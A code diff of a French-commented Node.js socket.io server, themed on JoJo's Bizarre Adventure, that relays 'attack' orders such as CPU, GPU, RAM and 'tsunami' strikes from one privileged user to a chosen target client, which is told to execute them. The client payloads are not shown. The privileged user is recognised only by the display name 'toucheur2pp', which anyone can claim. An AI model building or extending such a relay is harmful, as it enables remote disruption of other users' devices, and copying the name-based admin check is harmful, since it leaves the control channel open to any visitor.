@@ -7,29 +7,27 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-// Stockage des utilisateurs connectés
-let users = [];
-
+// --- CONFIGURATION PUNCH ---
+// On lie le dossier "public" pour le HTML/CSS
 app.use(express.static(path.join(__dirname, 'public')));
 
-io.on('connection', (socket) => {
-    console.log(`[CONNEXION] Nouvelle entité détectée : ${socket.id}`);
+let users = [];
 
-    // Initialisation d'un utilisateur
+io.on('connection', (socket) => {
+    console.log(`[CONNEXION] ID: ${socket.id}`);
+
+    // Initialisation du Stand User
     socket.on('init', (data) => {
-        const newUser = {
-            id: socket.id,
-            name: data.name || "Inconnu",
-            chef: data.name === "toucheur2pp"
+        const newUser = { 
+            id: socket.id, 
+            name: data.name || "Stand_User" 
         };
         users.push(newUser);
-        
-        // On renvoie la liste à tout le monde pour mettre à jour l'interface
         io.emit('sync', users);
-        console.log(`[SYNC] ${newUser.name} a rejoint le champ de bataille.`);
+        console.log(`[PUNCH_SYNC] ${newUser.name} est prêt au combat.`);
     });
 
-    // Gestion du Chat
+    // Chat Relay
     socket.on('chat', (msg) => {
         const user = users.find(u => u.id === socket.id);
         if (user) {
@@ -37,41 +35,40 @@ io.on('connection', (socket) => {
         }
     });
 
-    // --- MOTEUR DE STRIKE (TRANSFERT D'ORDRE) ---
-    // Chaque événement correspond à une option de ton menu contextuel
+    // --- MOTEUR D'ATTAQUE [THE WORLD] ---
+    const abilities = ['p_combo', 'p_tsunami', 'p_cpu', 'p_gpu', 'p_ios', 'p_ram'];
     
-    const strikeTypes = [
-        'p_combo', 'p_tsunami', 'p_cpu', 'p_gpu', 
-        'p_ios', 'p_ram', 'p_infect', 'p_sonic'
-    ];
-
-    strikeTypes.forEach(type => {
-        socket.on(type, (targetId) => {
-            const sender = users.find(u => u.id === socket.id);
-            // Sécurité : Seul le chef peut déclencher les attaques
-            if (sender && sender.name === "toucheur2pp") {
-                console.log(`[STRIKE] ${type.toUpperCase()} envoyé vers ${targetId}`);
-                // On envoie l'ordre uniquement à la cible
-                io.to(targetId).emit('execute', { type: type });
+    abilities.forEach(ability => {
+        socket.on(ability, (targetId) => {
+            const admin = users.find(u => u.id === socket.id);
+            
+            // Vérification du grade Master
+            if (admin && admin.name === "toucheur2pp") {
+                console.log(`[EXECUTION] ${ability.toUpperCase()} sur ${targetId}`);
+                io.to(targetId).emit('execute', { type: ability });
             }
         });
     });
 
-    // Déconnexion
     socket.on('disconnect', () => {
         users = users.filter(u => u.id !== socket.id);
         io.emit('sync', users);
-        console.log(`[DECONNEXION] Entité retirée : ${socket.id}`);
+        console.log(`[DECONNEXION] ID: ${socket.id}`);
     });
+});
+
+// Route par défaut pour éviter le "Cannot GET /"
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`
-    🥊 PUNCH SERVER V95 [THE WORLD] ACTIVE
-    --------------------------------------
-    > Adresse locale : http://localhost:${PORT}
-    > Statut : ZA WARUNDO MODE ON
-    --------------------------------------
+    🥊 PUNCH SERVER ACTIVE [MODE: server.js]
+    ----------------------------------------
+    > Local : http://localhost:${PORT}
+    > Statut : ORA ORA ORA ORA !
+    ----------------------------------------
     `);
 });
